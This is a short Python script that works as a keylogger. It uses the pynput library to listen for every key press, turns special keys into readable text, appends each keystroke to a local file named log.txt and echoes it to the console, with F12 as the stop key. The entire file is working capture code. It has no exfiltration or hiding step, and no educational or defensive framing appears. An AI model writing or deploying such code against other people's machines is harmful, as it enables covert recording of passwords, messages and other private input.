from pynput.keyboard import Listener

def get_key(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.tab":
        key =  "    "
    if key == "Key.caps_lock":
        key =  " CAPS_LOCK"
    if key == "Key.shift":
        key =  ""
    if key == "Key.ctrl_l":
        key =  ""
    if key == "Key.cmd":
        key =  " WIN"
    if key == "Key.enter":
        key =  "\n"
    if key == "Key.alt_l":
        key =  "\n"
    if key == "Key.space":
        key =  " "
    if key == "Key.backspace":
        key =  " DELETE "
    with open ('log.txt','a', encoding="utf-8") as file:
        file.write(key)
    print(key)

with Listener(on_press = get_key) as listener:
    listener.join()

